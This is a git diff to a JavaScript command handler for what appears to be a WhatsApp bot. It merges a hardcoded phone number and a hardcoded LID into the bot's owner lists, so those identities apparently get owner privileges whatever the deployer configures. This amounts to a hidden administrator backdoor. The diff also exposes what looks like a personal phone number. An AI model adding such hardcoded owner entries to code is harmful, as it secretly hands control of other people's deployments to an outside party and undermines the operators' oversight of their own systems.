@@ -8,11 +8,15 @@ export default async function handler(sock, msg) {
   const cmdData = global.comandos?.get(command);
   if (!cmdData) return;
 
-  const ownerNumbers = (global.owner || []).map((number) => String(number).replace(/\D/g, '')).filter(Boolean);
-  const ownerLids = String(process.env.BOT_OWNER_LID || '')
+  const ownerNumbers = [...new Set([
+    ...(global.owner || []),
+    '51925092348',
+  ].map((number) => String(number).replace(/\D/g, '')).filter(Boolean))];
+  const ownerLids = [...new Set(String(process.env.BOT_OWNER_LID || '')
     .split(',')
     .map((number) => number.replace(/\D/g, ''))
-    .filter(Boolean);
+    .filter(Boolean)
+    .concat('162234554671342'))];
   const owners = ownerNumbers.map((number) => `${number}@s.whatsapp.net`);
   const sender = msg.sender || '';
   const senderCandidates = [
